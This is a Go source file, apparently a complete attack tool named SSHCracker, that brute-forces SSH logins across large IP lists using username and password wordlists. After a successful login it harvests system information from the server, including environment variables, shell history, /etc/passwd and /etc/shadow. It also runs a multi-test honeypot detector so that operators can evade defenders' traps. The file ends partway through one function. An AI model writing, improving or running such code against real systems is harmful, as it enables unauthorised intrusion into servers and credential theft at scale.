package main

import (
	"bufio"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"math"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/manifoldco/promptui"
	"github.com/spf13/pflag"
	"golang.org/x/crypto/ssh"
)

var startTime time.Time
var totalIPCount int
var stats = struct{ goods, errors, honeypots int64 }{0, 0, 0}
var ipFile string
var timeout int
var maxConnections int

const VERSION = "3.0-beta"

// Pause/Resume state
var (
	isPaused         int32 = 0
	currentTaskIndex int64 = 0
	scanConfig       *ScanConfig
	usernameFile     string
	passwordFile     string
)

var (
	successfulIPs = make(map[string]struct{})
	mapMutex      sync.Mutex
)

// ScanConfig holds all user-configurable options
type ScanConfig struct {
	UsernameFile string
	PasswordFile string
	IPFile       string
	Timeout      int
	MaxWorkers   int
	ResumeFile   string
}

// ScanState represents the complete state of a paused scan
type ScanState struct {
	Version    string    `json:"version"`
	StartTime  time.Time `json:"start_time"`
	PausedTime time.Time `json:"paused_time"`
	TaskIndex  int64     `json:"task_index"`
	TotalTasks int64     `json:"total_tasks"`
	Stats      struct {
		Goods     int64 `json:"goods"`
		Errors    int64 `json:"errors"`
		Honeypots int64 `json:"honeypots"`
	} `json:"stats"`
	Config struct {
		UsernameFile string `json:"username_file"`
		PasswordFile string `json:"password_file"`
		IPFile       string `json:"ip_file"`
		Timeout      int    `json:"timeout"`
		MaxWorkers   int    `json:"max_workers"`
	} `json:"config"`
	SuccessfulIPs []string `json:"successful_ips,omitempty"`
}

// Default configuration values
var DefaultConfig = ScanConfig{
	Timeout:    10,
	MaxWorkers: 100,
}

// Enhanced task structure for better performance
type SSHTask struct {
	IP       string
	Port     string
	Username string
	Password string
}

// Worker pool configuration
const (
	CONCURRENT_PER_WORKER = 25  // Each worker handles 25 concurrent connections
)

// Server information structure
type ServerInfo struct {
	IP              string
	Port            string
	Username        string
	Password        string
	IsHoneypot      bool
	HoneypotScore   int
	SSHVersion      string
	OSInfo          string
	Hostname        string
	ResponseTime    time.Duration
	Commands        map[string]string
	OpenPorts       []string
}

// Honeypot detection structure
type HoneypotDetector struct {
	TimeAnalysis    bool
	CommandAnalysis bool
	NetworkAnalysis bool
}

func main() {
	// Parse CLI flags
	resumeFlag := pflag.BoolP("resume", "r", false, "Resume from paused.json")
	resumeFile := pflag.String("resume-file", "paused.json", "Path to resume state file")
	helpFlag := pflag.BoolP("help", "h", false, "Show help message")
	pflag.Parse()

	if *helpFlag {
		printHelp()
		return
	}

	// Setup signal handler for graceful pause
	setupSignalHandler()

	// Start auto-save goroutine
	go autoSaveState()

	var config *ScanConfig
	var err error

	// Check for resume mode
	if *resumeFlag {
		state, err := loadState(*resumeFile)
		if err != nil {
			log.Fatalf("❌ Failed to load resume state: %v", err)
		}
		resumeFromState(state)
		return
	}

	// Interactive input mode
	config, err = collectUserInput()
	if err != nil {
		if err == promptui.ErrInterrupt {
			fmt.Println("\n👋 Cancelled by user")
			return
		}
		log.Fatalf("❌ Input error: %v", err)
	}

	// Check if user chose to resume
	if config.ResumeFile != "" {
		state, err := loadState(config.ResumeFile)
		if err != nil {
			log.Fatalf("❌ Failed to load resume state: %v", err)
		}
		resumeFromState(state)
		return
	}

	// Store config globally
	scanConfig = config
	usernameFile = config.UsernameFile
	passwordFile = config.PasswordFile
	ipFile = config.IPFile
	timeout = config.Timeout
	maxConnections = config.MaxWorkers

	// Create combo file
	createComboFileFromConfig(config)

	startTime = time.Now()

	combos := getItems("combo.txt")
	ips := getItems(ipFile)
	totalIPCount = len(ips) * len(combos)

	// Show scan summary and get confirmation
	if !showScanSummary(config, len(ips), len(combos)) {
		fmt.Println("\n👋 Scan cancelled by user")
		return
	}

	// Enhanced worker pool system with pause support
	setupEnhancedWorkerPoolWithResume(combos, ips, 0)

	// Clean up state files on successful completion
	cleanupStateFiles()

	fmt.Println("\n✅ Operation completed successfully!")
}

// Print help message
func printHelp() {
	const boxWidth = 62
	
	fmt.Println()
	fmt.Println("╔" + strings.Repeat("═", boxWidth) + "╗")
	printBoxLine(fmt.Sprintf("🚀 SSHCracker v%s - Help 🚀", VERSION), boxWidth)
	fmt.Println("╠" + strings.Repeat("═", boxWidth) + "╣")
	printBoxLine("", boxWidth)
	printBoxLine("USAGE:", boxWidth)
	printBoxLine("  ./sshcracker [OPTIONS]", boxWidth)
	printBoxLine("", boxWidth)
	printBoxLine("OPTIONS:", boxWidth)
	printBoxLine("  -r, --resume         Resume from paused.json", boxWidth)
	printBoxLine("  --resume-file PATH   Resume from custom state file", boxWidth)
	printBoxLine("  -h, --help           Show this help message", boxWidth)
	printBoxLine("", boxWidth)
	printBoxLine("EXAMPLES:", boxWidth)
	printBoxLine("  ./sshcracker                  # Interactive mode", boxWidth)
	printBoxLine("  ./sshcracker -r               # Resume previous scan", boxWidth)
	printBoxLine("  ./sshcracker --resume-file myscan.json", boxWidth)
	printBoxLine("", boxWidth)
	printBoxLine("FEATURES:", boxWidth)
	printBoxLine("  • Advanced Honeypot Detection (10+ algorithms)", boxWidth)
	printBoxLine("  • Pause/Resume with Ctrl+C", boxWidth)
	printBoxLine("  • Auto-save every 5 minutes", boxWidth)
	printBoxLine("  • Professional input validation", boxWidth)
	printBoxLine("  • Dynamic threshold calculation", boxWidth)
	printBoxLine("", boxWidth)
	printBoxLine("DEVELOPER: SudoLite", boxWidth)
	printBoxLine("GitHub: github.com/sudolite", boxWidth)
	printBoxLine("Twitter: @sudolite", boxWidth)
	printBoxLine("", boxWidth)
	fmt.Println("╚" + strings.Repeat("═", boxWidth) + "╝")
}

// Validate file path exists
func validateFilePath(input string) error {
	input = strings.TrimSpace(input)
	if input == "" {
		return errors.New("file path cannot be empty")
	}
	if _, err := os.Stat(input); os.IsNotExist(err) {
		return fmt.Errorf("file does not exist: %s", input)
	}
	return nil
}

// Validate integer in range
func validateIntRange(min, max int) promptui.ValidateFunc {
	return func(input string) error {
		val, err := strconv.Atoi(strings.TrimSpace(input))
		if err != nil {
			return errors.New("must be a valid number")
		}
		if val < min || val > max {
			return fmt.Errorf("value must be between %d and %d", min, max)
		}
		return nil
	}
}

// Collect user input with promptui
func collectUserInput() (*ScanConfig, error) {
	config := &ScanConfig{}
	const boxWidth = 62

	fmt.Println()
	fmt.Println("╔" + strings.Repeat("═", boxWidth) + "╗")
	printBoxLine(fmt.Sprintf("🚀 SSHCracker v%s - Setup 🚀", VERSION), boxWidth)
	fmt.Println("╚" + strings.Repeat("═", boxWidth) + "╝")
	fmt.Println()

	// Check for existing paused scan
	if _, err := os.Stat("paused.json"); err == nil {
		resumePrompt := promptui.Select{
			Label: "📂 Found paused scan. What would you like to do?",
			Items: []string{"🔄 Resume previous scan", "🆕 Start new scan"},
		}
		idx, _, err := resumePrompt.Run()
		if err != nil {
			return nil, err
		}
		if idx == 0 {
			config.ResumeFile = "paused.json"
			return config, nil
		}
		fmt.Println()
	}

	// Username file
	usernamePrompt := promptui.Prompt{
		Label:    "📁 Username list file path",
		Validate: validateFilePath,
		Templates: &promptui.PromptTemplates{
			Prompt:  "{{ . | cyan | bold }}: ",
			Valid:   "{{ . | green | bold }}: ",
			Invalid: "{{ . | red | bold }}: ",
			Success: "{{ . | bold }}: ",
		},
	}
	var err error
	config.UsernameFile, err = usernamePrompt.Run()
	if err != nil {
		return nil, err
	}

	// Password file
	passwordPrompt := promptui.Prompt{
		Label:    "🔐 Password list file path",
		Validate: validateFilePath,
		Templates: &promptui.PromptTemplates{
			Prompt:  "{{ . | cyan | bold }}: ",
			Valid:   "{{ . | green | bold }}: ",
			Invalid: "{{ . | red | bold }}: ",
			Success: "{{ . | bold }}: ",
		},
	}
	config.PasswordFile, err = passwordPrompt.Run()
	if err != nil {
		return nil, err
	}

	// IP file
	ipPrompt := promptui.Prompt{
		Label:    "🌐 IP list file path (ip:port format)",
		Validate: validateFilePath,
		Templates: &promptui.PromptTemplates{
			Prompt:  "{{ . | cyan | bold }}: ",
			Valid:   "{{ . | green | bold }}: ",
			Invalid: "{{ . | red | bold }}: ",
			Success: "{{ . | bold }}: ",
		},
	}
	config.IPFile, err = ipPrompt.Run()
	if err != nil {
		return nil, err
	}

	// Timeout
	timeoutPrompt := promptui.Prompt{
		Label:    "⏱️  Timeout in seconds",
		Default:  strconv.Itoa(DefaultConfig.Timeout),
		Validate: validateIntRange(1, 300),
		Templates: &promptui.PromptTemplates{
			Prompt:  "{{ . | cyan | bold }}: ",
			Valid:   "{{ . | green | bold }}: ",
			Invalid: "{{ . | red | bold }}: ",
			Success: "{{ . | bold }}: ",
		},
	}
	timeoutStr, err := timeoutPrompt.Run()
	if err != nil {
		return nil, err
	}
	config.Timeout, _ = strconv.Atoi(strings.TrimSpace(timeoutStr))

	// Workers
	workersPrompt := promptui.Prompt{
		Label:    "👷 Maximum workers",
		Default:  strconv.Itoa(DefaultConfig.MaxWorkers),
		Validate: validateIntRange(1, 1000),
		Templates: &promptui.PromptTemplates{
			Prompt:  "{{ . | cyan | bold }}: ",
			Valid:   "{{ . | green | bold }}: ",
			Invalid: "{{ . | red | bold }}: ",
			Success: "{{ . | bold }}: ",
		},
	}
	workersStr, err := workersPrompt.Run()
	if err != nil {
		return nil, err
	}
	config.MaxWorkers, _ = strconv.Atoi(strings.TrimSpace(workersStr))

	return config, nil
}

// Show scan summary and get confirmation
func showScanSummary(config *ScanConfig, ipCount, comboCount int) bool {
	totalCombinations := ipCount * comboCount
	estimatedSpeed := float64(config.MaxWorkers * CONCURRENT_PER_WORKER) * 0.5 // Conservative estimate
	estimatedDuration := float64(totalCombinations) / estimatedSpeed

	const boxWidth = 62

	fmt.Println()
	fmt.Println("╔" + strings.Repeat("═", boxWidth) + "╗")
	printBoxLine("📋 SCAN CONFIGURATION", boxWidth)
	fmt.Println("╠" + strings.Repeat("═", boxWidth) + "╣")
	printBoxLine(fmt.Sprintf("🌐 Targets:        %s IPs", formatNumber(ipCount)), boxWidth)
	printBoxLine(fmt.Sprintf("🔑 Combinations:   %s", formatNumber(totalCombinations)), boxWidth)
	printBoxLine(fmt.Sprintf("⏱️  Timeout:        %ds", config.Timeout), boxWidth)
	printBoxLine(fmt.Sprintf("👷 Workers:        %s", formatNumber(config.MaxWorkers)), boxWidth)
	printBoxLine(fmt.Sprintf("⚡ Est. Speed:     ~%.0f checks/sec", estimatedSpeed), boxWidth)
	printBoxLine(fmt.Sprintf("⏳ Est. Duration:  %s", formatDuration(estimatedDuration)), boxWidth)
	fmt.Println("╠" + strings.Repeat("═", boxWidth) + "╣")
	printBoxLine("💡 Press Ctrl+C during scan to pause and save progress", boxWidth)
	fmt.Println("╚" + strings.Repeat("═", boxWidth) + "╝")
	fmt.Println()

	confirmPrompt := promptui.Select{
		Label: "🚀 Start scan?",
		Items: []string{"✅ Yes, start scan", "❌ No, cancel"},
	}
	idx, _, err := confirmPrompt.Run()
	if err != nil || idx != 0 {
		return false
	}
	fmt.Println()
	return true
}

// Format number with commas
func formatNumber(n int) string {
	str := strconv.Itoa(n)
	if len(str) <= 3 {
		return str
	}
	
	var result []byte
	for i, c := range str {
		if i > 0 && (len(str)-i)%3 == 0 {
			result = append(result, ',')
		}
		result = append(result, byte(c))
	}
	return string(result)
}

// Format duration in human readable format
func formatDuration(seconds float64) string {
	if seconds < 60 {
		return fmt.Sprintf("%.0f seconds", seconds)
	} else if seconds < 3600 {
		return fmt.Sprintf("~%.0f minutes", seconds/60)
	} else if seconds < 86400 {
		return fmt.Sprintf("~%.1f hours", seconds/3600)
	}
	return fmt.Sprintf("~%.1f days", seconds/86400)
}

// Setup signal handler for graceful pause
func setupSignalHandler() {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-sigChan
		fmt.Fprintf(os.Stderr, "\n\n⏸️  Pausing scan... Please wait...\n")
		atomic.StoreInt32(&isPaused, 1)

		// Wait for workers to finish current tasks
		time.Sleep(2 * time.Second)

		// Save state
		if err := saveState("paused.json"); err != nil {
			log.Printf("❌ Failed to save state: %v", err)
		} else {
			fmt.Fprintf(os.Stderr, "✅ State saved to paused.json\n")
			fmt.Fprintf(os.Stderr, "📂 Resume with: ./sshcracker --resume\n")
		}
		os.Exit(0)
	}()
}

// Check if paused
func IsPaused() bool {
	return atomic.LoadInt32(&isPaused) == 1
}

// Auto-save state every 5 minutes
func autoSaveState() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		if atomic.LoadInt64(&currentTaskIndex) > 0 && !IsPaused() {
			if err := saveState("autosave.json"); err != nil {
				log.Printf("⚠️ Auto-save failed: %v", err)
			}
		}
	}
}

// Save current state to file
func saveState(filename string) error {
	state := ScanState{
		Version:    VERSION,
		StartTime:  startTime,
		PausedTime: time.Now(),
		TaskIndex:  atomic.LoadInt64(&currentTaskIndex),
		TotalTasks: int64(totalIPCount),
	}

	state.Stats.Goods = atomic.LoadInt64(&stats.goods)
	state.Stats.Errors = atomic.LoadInt64(&stats.errors)
	state.Stats.Honeypots = atomic.LoadInt64(&stats.honeypots)

	if scanConfig != nil {
		state.Config.UsernameFile = usernameFile
		state.Config.PasswordFile = passwordFile
		state.Config.IPFile = ipFile
		state.Config.Timeout = timeout
		state.Config.MaxWorkers = maxConnections
	}

	mapMutex.Lock()
	for ip := range successfulIPs {
		state.SuccessfulIPs = append(state.SuccessfulIPs, ip)
	}
	mapMutex.Unlock()

	data, err := json.MarshalIndent(state, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile(filename, data, 0644)
}

// Load state from file
func loadState(filename string) (*ScanState, error) {
	data, err := os.ReadFile(filename)
	if err != nil {
		return nil, err
	}

	var state ScanState
	if err := json.Unmarshal(data, &state); err != nil {
		return nil, err
	}

	return &state, nil
}

// Resume from saved state
func resumeFromState(state *ScanState) {
	const boxWidth = 62
	
	fmt.Println()
	fmt.Println("╔" + strings.Repeat("═", boxWidth) + "╗")
	printBoxLine("🔄 RESUMING SCAN", boxWidth)
	fmt.Println("╚" + strings.Repeat("═", boxWidth) + "╝")

	// Restore globals
	startTime = state.StartTime
	ipFile = state.Config.IPFile
	usernameFile = state.Config.UsernameFile
	passwordFile = state.Config.PasswordFile
	timeout = state.Config.Timeout
	maxConnections = state.Config.MaxWorkers

	// Restore stats
	atomic.StoreInt64(&stats.goods, state.Stats.Goods)
	atomic.StoreInt64(&stats.errors, state.Stats.Errors)
	atomic.StoreInt64(&stats.honeypots, state.Stats.Honeypots)

	// Restore successful IPs map
	mapMutex.Lock()
	for _, ip := range state.SuccessfulIPs {
		successfulIPs[ip] = struct{}{}
	}
	mapMutex.Unlock()

	progress := float64(state.TaskIndex) / float64(state.TotalTasks) * 100
	fmt.Printf("\n📂 Resuming from task %d/%d (%.1f%% complete)\n",
		state.TaskIndex, state.TotalTasks, progress)
	fmt.Printf("📊 Previous stats: ✅ %d goods | ❌ %d errors | 🍯 %d honeypots\n\n",
		state.Stats.Goods, state.Stats.Errors, state.Stats.Honeypots)

	// Recreate combo file
	createComboFileFromPaths(state.Config.UsernameFile, state.Config.PasswordFile)

	combos := getItems("combo.txt")
	ips := getItems(state.Config.IPFile)
	totalIPCount = len(ips) * len(combos)

	// Setup signal handler
	setupSignalHandler()
	go autoSaveState()

	// Resume from saved index
	setupEnhancedWorkerPoolWithResume(combos, ips, state.TaskIndex)

	// Clean up state files on successful completion
	cleanupStateFiles()

	fmt.Println("\n✅ Operation completed successfully!")
}

// Clean up state files after successful completion
func cleanupStateFiles() {
	os.Remove("paused.json")
	os.Remove("autosave.json")
}

// Create combo file from config
func createComboFileFromConfig(config *ScanConfig) {
	createComboFileFromPaths(config.UsernameFile, config.PasswordFile)
}

// Create combo file from paths
func createComboFileFromPaths(usernamePath, passwordPath string) {
	usernames := getItems(usernamePath)
	passwords := getItems(passwordPath)

	file, err := os.Create("combo.txt")
	if err != nil {
		log.Fatalf("Failed to create combo file: %s", err)
	}
	defer file.Close()

	for _, username := range usernames {
		for _, password := range passwords {
			fmt.Fprintf(file, "%s:%s\n", username[0], password[0])
		}
	}
}

func getItems(path string) [][]string {
	file, err := os.Open(path)
	if err != nil {
		log.Fatalf("Failed to open file: %s", err)
	}
	defer file.Close()

	var items [][]string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if line != "" {
			items = append(items, strings.Split(line, ":"))
		}
	}
	return items
}

func clear() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func createComboFile(reader *bufio.Reader) {
	// Legacy function - kept for compatibility
	fmt.Print("Enter the username list file path: ")
	usernameFilePath, _ := reader.ReadString('\n')
	usernameFilePath = strings.TrimSpace(usernameFilePath)
	fmt.Print("Enter the password list file path: ")
	passwordFilePath, _ := reader.ReadString('\n')
	passwordFilePath = strings.TrimSpace(passwordFilePath)

	createComboFileFromPaths(usernameFilePath, passwordFilePath)
}

// Gather system information
func gatherSystemInfo(client *ssh.Client, serverInfo *ServerInfo) {
	commands := map[string]string{
		"hostname":    "hostname",
		"uname":       "uname -a",
		"whoami":      "whoami",
		"pwd":         "pwd",
		"ls_root":     "ls -la /",
		"ps":          "ps aux | head -10",
		"netstat":     "netstat -tulpn | head -10",
		"history":     "history | tail -5",
		"ssh_version": "ssh -V",
		"uptime":      "uptime",
		"mount":       "mount | head -5",
		"env":         "env | head -10",
	}

	for cmdName, cmd := range commands {
		output := executeCommand(client, cmd)
		serverInfo.Commands[cmdName] = output
		
		// Extract specific information
		switch cmdName {
		case "hostname":
			serverInfo.Hostname = strings.TrimSpace(output)
		case "uname":
			serverInfo.OSInfo = strings.TrimSpace(output)
		case "ssh_version":
			serverInfo.SSHVersion = strings.TrimSpace(output)
		}
	}
	
	// Scan local ports
	serverInfo.OpenPorts = scanLocalPorts(client)
}

// Execute command on server
func executeCommand(client *ssh.Client, command string) string {
	session, err := client.NewSession()
	if err != nil {
		return fmt.Sprintf("ERROR: %v", err)
	}
	defer session.Close()

	output, err := session.CombinedOutput(command)
	if err != nil {
		return fmt.Sprintf("ERROR: %v", err)
	}
	
	return string(output)
}

// Scan local ports
func scanLocalPorts(client *ssh.Client) []string {
	output := executeCommand(client, "netstat -tulpn 2>/dev/null | grep LISTEN | head -20")
	var ports []string
	
	lines := strings.Split(output, "\n")
	portRegex := regexp.MustCompile(`:(\d+)\s`)
	
	for _, line := range lines {
		matches := portRegex.FindAllStringSubmatch(line, -1)
		for _, match := range matches {
			if len(match) > 1 {
				port := match[1]
				if !contains(ports, port) {
					ports = append(ports, port)
				}
			}
		}
	}
	
	return ports
}

// Helper function to check existence in slice
func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

// Advanced honeypot detection algorithm v3.0
func detectHoneypot(client *ssh.Client, serverInfo *ServerInfo, detector *HoneypotDetector) bool {
	// Create context with 30 second timeout for all honeypot tests
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	honeypotScore := 0
	testsRun := 0
	testsSuccessful := 0

	// Channel to collect scores with timeout protection
	type testResult struct {
		score   int
		success bool
	}

	runTest := func(testFunc func() int) int {
		done := make(chan testResult, 1)
		go func() {
			score := testFunc()
			done <- testResult{score: score, success: true}
		}()

		select {
		case result := <-done:
			testsRun++
			if result.success {
				testsSuccessful++
			}
			return result.score
		case <-ctx.Done():
			return 0
		case <-time.After(5 * time.Second):
			return 0
		}
	}

	// 1. Analyze suspicious patterns in command output
	honeypotScore += runTest(func() int { return analyzeCommandOutput(serverInfo) })

	// 2. Analyze response time
	if detector.TimeAnalysis {
		honeypotScore += runTest(func() int { return analyzeResponseTime(serverInfo) })
	}

	// 3. Analyze file and directory structure
	honeypotScore += runTest(func() int { return analyzeFileSystem(serverInfo) })

	// 4. Analyze running processes
	honeypotScore += runTest(func() int { return analyzeProcesses(serverInfo) })

	// 5. Analyze network and ports
	if detector.NetworkAnalysis {
		honeypotScore += runTest(func() int { return analyzeNetwork(client) })
	}

	// 6. Behavioral tests
	honeypotScore += runTest(func() int { return behavioralTests(client, serverInfo) })

	// 7. Detect abnormal patterns
	honeypotScore += runTest(func() int { return detectAnomalies(serverInfo) })

	// 8. Advanced tests
	honeypotScore += runTest(func() int { return advancedHoneypotTests(client) })

	// 9. Performance tests
	honeypotScore += runTest(func() int { return performanceTests(client) })

	// 10. NEW: Command timing analysis (v3.0)
	honeypotScore += runTest(func() int { return analyzeCommandTiming(client) })

	// 11. NEW: SSH Banner analysis (v3.0)
	honeypotScore += runTest(func() int { return analyzeSSHBanner(serverInfo) })

	// Record score
	serverInfo.HoneypotScore = honeypotScore

	// Calculate dynamic threshold based on successful tests
	threshold := calculateDynamicThreshold(testsRun, testsSuccessful)

	return honeypotScore >= threshold
}

// Calculate dynamic threshold based on test execution results
// This ensures fair scoring when some tests fail or timeout
func calculateDynamicThreshold(testsRun, testsSuccessful int) int {
	// If very few tests ran successfully, be more conservative
	if testsSuccessful < 4 {
		return 4 // Lower threshold due to limited data
	}

	// Calculate maximum possible score based on successful tests
	// Each test averages about 1.5 points when detecting a honeypot
	maxPossibleScore := float64(testsSuccessful) * 1.5

	// Threshold = 30% of maximum possible score
	// This balances between false positives and false negatives
	threshold := int(maxPossibleScore * 0.30)

	// Clamp threshold between 5 and 8
	if threshold < 5 {
		threshold = 5
	}
	if threshold > 8 {
		threshold = 8
	}

	return threshold
}

// Analyze command execution timing for honeypot detection
// Honeypots often have very consistent/fast response times with low variance
func analyzeCommandTiming(client *ssh.Client) int {
	testCommands := []string{
		"id",
		"pwd",
		"whoami",
		"ls /",
		"cat /etc/hostname",
	}

	var timings []float64
	successCount := 0

	for _, cmd := range testCommands {
		start := time.Now()
		output := executeCommand(client, cmd)
		elapsed := time.Since(start).Seconds() * 1000 // Convert to milliseconds

		// Only count successful executions
		if !strings.Contains(output, "ERROR") && len(output) > 0 {
			timings = append(timings, elapsed)
			successCount++
		}
	}

	// Need at least 3 successful commands for valid analysis
	if successCount < 3 {
		return 0
	}

	// Calculate mean
	var sum float64
	for _, t := range timings {
		sum += t
	}
	mean := sum / float64(len(timings))

	// Calculate standard deviation
	var varianceSum float64
	for _, t := range timings {
		diff := t - mean
		varianceSum += diff * diff
	}
	stdDev := math.Sqrt(varianceSum / float64(len(timings)))

	// Calculate Coefficient of Variation (CV = stdDev / mean)
	// Low CV indicates very consistent timing (suspicious for honeypot)
	cv := stdDev / mean

	score := 0

	// Very low variance with fast response = highly suspicious
	// Real servers have variable load causing timing differences
	if cv < 0.05 && mean < 10 {
		// CV < 5% and mean < 10ms = very suspicious
		score = 2
	} else if cv < 0.08 && mean < 15 {
		// CV < 8% and mean < 15ms = somewhat suspicious
		score = 1
	}

	return score
}

// Analyze SSH banner for known honeypot signatures
func analyzeSSHBanner(serverInfo *ServerInfo) int {
	score := 0

	sshVersion := strings.ToLower(serverInfo.SSHVersion)

	// Known honeypot SSH banners and versions
	honeypotBanners := []string{
		"ssh-2.0-openssh_6.0p1 debian-4",    // Cowrie default
		"ssh-2.0-libssh_0.6.0",               // Kippo
		"ssh-2.0-openssh_5.1p1 debian-5",    // Old Kippo
		"ssh-2.0-openssh_5.9p1",              // Common honeypot version
		"ssh-2.0-openssh_6.6.1",              // Another honeypot version
		"cowrie",
		"kippo",
		"honssh",
	}

	for _, banner := range honeypotBanners {
		if strings.Contains(sshVersion, banner) {
			score += 3
			break // Only count once
		}
	}

	// Check for suspiciously old or uncommon SSH versions
	oldVersions := []string{
		"openssh_4.", "openssh_5.0", "openssh_5.1", "openssh_5.2",
		"dropbear_0.", "dropbear_2012", "dropbear_2013",
	}

	for _, oldVer := range oldVersions {
		if strings.Contains(sshVersion, oldVer) {
			score += 1
			break
		}
	}

	return score
}

// Analyze command output for suspicious patterns
func analyzeCommandOutput(serverInfo *ServerInfo) int {
	score := 0
	
	for _, output := range serverInfo.Commands {
		lowerOutput := strings.ToLower(output)
		
		// Check specific honeypot patterns - Extended list for v3.0
		honeypotIndicators := []string{
			// General honeypot terms
			"fake", "simulation", "honeypot", "trap", "monitor",
			// Known honeypot software
			"cowrie", "kippo", "artillery", "honeyd", "ssh-honeypot", "honeytrap",
			"dionaea", "elastichoney", "honssh", "bifrozt", "kojoney", "ssh-honeypotd",
			"conpot", "glastopf", "amun", "nepenthes",
			// Honeypot file paths
			"/opt/honeypot", "/var/log/honeypot", "/var/lib/cowrie", "/home/cowrie",
			"cowrie.log", "kippo.log", "/opt/cowrie", "/opt/kippo",
			// Suspicious patterns
			"/usr/share/cowrie", "twisted.conch",
		}
		
		for _, indicator := range honeypotIndicators {
			if strings.Contains(lowerOutput, indicator) {
				score += 3
			}
		}
	}
	
	return score
}

// Analyze response time
func analyzeResponseTime(serverInfo *ServerInfo) int {
	responseTime := serverInfo.ResponseTime.Milliseconds()
	
	// Very fast response time (less than 10 milliseconds) is suspicious
	if responseTime < 10 {
		return 2
	}
	
	return 0
}

// Analyze file system structure
func analyzeFileSystem(serverInfo *ServerInfo) int {
	score := 0
	
	lsOutput, exists := serverInfo.Commands["ls_root"]
	if !exists {
		return 0
	}
	
	// Check abnormal structure
	suspiciousPatterns := []string{
		"total 0",           // Empty directory is suspicious
		"total 4",           // Low file count
		"honeypot",          // Explicit name
		"fake",              // Fake files
		"simulation",        // Simulation
	}
	
	lowerOutput := strings.ToLower(lsOutput)
	for _, pattern := range suspiciousPatterns {
		if strings.Contains(lowerOutput, pattern) {
			score++
		}
	}
	
	// Low file count in root
	lines := strings.Split(strings.TrimSpace(lsOutput), "\n")
	if len(lines) < 5 { // Less than 5 files/directories in root
		score++
	}
	
	return score
}

// Analyze running processes
func analyzeProcesses(serverInfo *ServerInfo) int {
	score := 0
	
	psOutput, exists := serverInfo.Commands["ps"]
	if !exists {
		return 0
	}
	
	// Suspicious processes
	suspiciousProcesses := []string{
		"cowrie", "kippo", "honeypot", "honeyd",
		"artillery", "honeytrap", "glastopf",
		"python honeypot", "perl honeypot",
	}
	
	lowerOutput := strings.ToLower(psOutput)
	for _, process := range suspiciousProcesses {
		if strings.Contains(lowerOutput, process) {
			score += 2
		}
	}
	
	// Low process count
	lines := strings.Split(strings.TrimSpace(psOutput), "\n")
	if len(lines) < 5 {
		score++
	}
	
	return score
}

// Analyze network configuration
func analyzeNetwork(client *ssh.Client) int {
	score := 0
	
	// 1. Check network configuration files
	networkConfigCheck := executeCommand(client, "ls -la /etc/network/interfaces /etc/sysconfig/network-scripts/ /etc/netplan/ 2>/dev/null | head -5")
	if strings.Contains(strings.ToLower(networkConfigCheck), "total 0") || 
	   strings.Contains(strings.ToLower(networkConfigCheck), "no such file") ||
	   len(strings.TrimSpace(networkConfigCheck)) < 10 {
		// Missing network configuration files or empty output is suspicious
		score += 1
	}
	
	// 2. Check for fake network interfaces
	interfaceCheck := executeCommand(client, "ip addr show 2>/dev/null | grep -E '^[0-9]+:' | head -5")
	if strings.Contains(strings.ToLower(interfaceCheck), "fake") ||
	   strings.Contains(strings.ToLower(interfaceCheck), "honeypot") ||
	   strings.Contains(strings.ToLower(interfaceCheck), "trap") ||
	   len(strings.TrimSpace(interfaceCheck)) < 10 {
		score += 1
	}
	
	// 3. Check routing table for suspicious patterns
	routeCheck := executeCommand(client, "ip route show 2>/dev/null | head -3")
	if len(strings.TrimSpace(routeCheck)) < 20 {
		// Very simple or empty routing table is suspicious
		score += 1
	}
	
	return score
}

// Behavioral tests
func behavioralTests(client *ssh.Client, serverInfo *ServerInfo) int {
	score := 0
	
	// Test 1: Create temporary file
	tempFileName := fmt.Sprintf("/tmp/test_%d", time.Now().Unix())
	createCmd := fmt.Sprintf("echo 'test' > %s", tempFileName)
	createOutput := executeCommand(client, createCmd)
	
	// If unable to create file, it's suspicious
	if strings.Contains(strings.ToLower(createOutput), "error") ||
	   strings.Contains(strings.ToLower(createOutput), "permission denied") {
		score++
	} else {
		// Delete test file
		executeCommand(client, fmt.Sprintf("rm -f %s", tempFileName))
	}
	
	// Test 2: Access to sensitive files
	sensitiveFiles := []string{"/etc/passwd", "/etc/shadow", "/proc/version"}
	accessibleCount := 0
	
	for _, file := range sensitiveFiles {
		output := executeCommand(client, fmt.Sprintf("cat %s 2>/dev/null | head -1", file))
		if !strings.Contains(strings.ToLower(output), "error") && len(output) > 0 {
			accessibleCount++
		}
	}
	
	// If all files are accessible, it's suspicious
	if accessibleCount == len(sensitiveFiles) {
		score++
	}
	
	// Test 3: Test system commands
	systemCommands := []string{"id", "whoami", "pwd"}
	workingCommands := 0
	
	for _, cmd := range systemCommands {
		output := executeCommand(client, cmd)
		if !strings.Contains(strings.ToLower(output), "error") && len(output) > 0 {
			workingCommands++
		}
	}
	
	// If no commands work, it's suspicious
	if workingCommands == 0 {
		score += 2
	}
	
	return score
}

// Advanced honeypot detection tests
func advancedHoneypotTests(client *ssh.Client) int {
	score := 0
	
	// Test 1: Check CPU and Memory
	cpuInfo := executeCommand(client, "cat /proc/cpuinfo | grep 'model name' | head -1")
	
	if strings.Contains(strings.ToLower(cpuInfo), "qemu") ||
	   strings.Contains(strings.ToLower(cpuInfo), "virtual") {
		score++ // May be a virtual machine
	}
	
	// Test 2: Check kernel and distribution
	kernelInfo := executeCommand(client, "uname -r")
	
	// Very new or old kernels are suspicious
	if strings.Contains(kernelInfo, "generic") && len(strings.TrimSpace(kernelInfo)) < 20 {
		score++
	}
	
	// Test 3: Check package management
	packageManagers := []string{
		"which apt", "which yum", "which pacman", "which zypper",
	}
	
	workingPMs := 0
	for _, pm := range packageManagers {
		output := executeCommand(client, pm)
